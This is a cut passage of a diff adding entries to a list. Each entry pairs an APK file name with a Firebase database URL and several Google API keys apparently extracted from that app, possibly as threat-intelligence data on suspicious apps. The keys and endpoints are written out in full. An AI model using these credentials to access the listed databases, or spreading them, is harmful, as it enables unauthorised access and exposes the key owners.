+    {"tag": 'base (35).apk', "url": 'https://rahu80759-ac69b-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
+    {"tag": 'base (35).apk', "url": 'https://samar95476-54eb9-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
+    {"tag": 'base (35).apk', "url": 'https://samar84900-6f084-default-rtdb.firebaseio.com', "keys": ['AIzaSyA9ViACbG-4iDooKvf-QEBq0ICoM-uT-f0', 'AIzaSyAy5QbbJwK0gHrt3-LZmbU7PxuVU6ZDw50', 'AIzaSyCfzlvNg6vYgd69dcHB0dpf6H6Ipz_yZsY', 'AIzaSyCp7YJATv2jsGuH0QHZ7n2RwNQIWhNU5mM', 'AIzaSyDDUhxUpo2jXam6ez8Wz92y9Kebf9cVtIA', 'AIzaSyDiiky_NvdG7tsU1MRQePT0-NuKHvVoFAQ', 'AIzaSyDmvtf9EwVSsffqOJarrAgWaGAhYa-m1_E']},
+    {"tag": 'base (4) (3).apk', "url": 'https://server14-c6551-default-rtdb.firebaseio.com', "keys": ['AIzaSyCt0gdzlqIxnuJH4TUzgEPJD3111w_qkBg']},
+    {"tag": 'base (4).apk', "url": 'https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyBa8wRzdVyXo-MSUMbnibj8qmoOor49uUY']},
+    {"tag": 'base (40).apk', "url": 'https://panel-wala-v70-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'base (42).apk', "url": 'https://ruhr-4da8f-default-rtdb.firebaseio.com', "keys": ['AIzaSyCdKKxasC0wyxiW1f2qGOV3b24710-tNJ8']},
+    {"tag": 'base (8) (1).apk', "url": 'https://jayma-9ce22-default-rtdb.firebaseio.com', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base (8) (1).apk', "url": 'https://annapunna-12b79-default-rtdb.firebaseio.com', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base (8) (1).apk', "url": 'https://newappi-7661a-default-rtdb.firebaseio.com', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base (8) (1).apk', "url": 'https://dwala-3d1ff-default-rtdb.firebaseio.com', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base (8) (1).apk', "url": 'https://pinkyrani-default-rtdb.firebaseio.com', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base (8) (1).apk', "url": 'https://komaljah-default-rtdb.firebaseio.com', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base (8) (1).apk', "url": 'https://binacallwalahe-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyANVndD8aVFoGpg-w5SbrHPGajrYv5wpzo', 'AIzaSyAVwTIwqW_oKyXZhaA6HFnNB7uD4k3U1tY', 'AIzaSyAW0ODNbYscLvfR8peqI7mEdf_16dArlws', 'AIzaSyBxSWK2jUvbczs57IgcRTSql_QQ6en_j7A', 'AIzaSyCDQ5Bu_0Ag4BRZXoIBQ1p2Sm9A1NTn2fY', 'AIzaSyCOcxmOCivdRSq4w-pYS44g2-P7HdYUyKE', 'AIzaSyCgEzi1tlT5gBTr8y9AsrDFtrlRbDJ2D4w']},
+    {"tag": 'base-6-1 (3).apk', "url": 'https://panel-wala-v1-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": []},
+    {"tag": 'base.apk', "url": 'https://chfjfj-c2857-default-rtdb.firebaseio.com', "keys": ['AIzaSyCAD1dGu5emRyr5YpnmLvwqffaK78hjAFI']},
+    {"tag": 'business-apps-5aeb2', "url": 'https://business-apps-5aeb2-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'challan5', "url": 'https://challan5-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'chudaaai 9.apk', "url": 'https://dogla-de225-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://gren-ff2af-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://loda-5029e-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://mpari-6a6e5-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://comeback-5b876-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://strom-90e84-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://singhaana-6f199-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://flash-v7powerengine-v7-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://money-ace2c-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://vecna-82db2-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://rajputchuttad-default-rtdb.firebaseio.com', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://dadddy-ec5fa-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 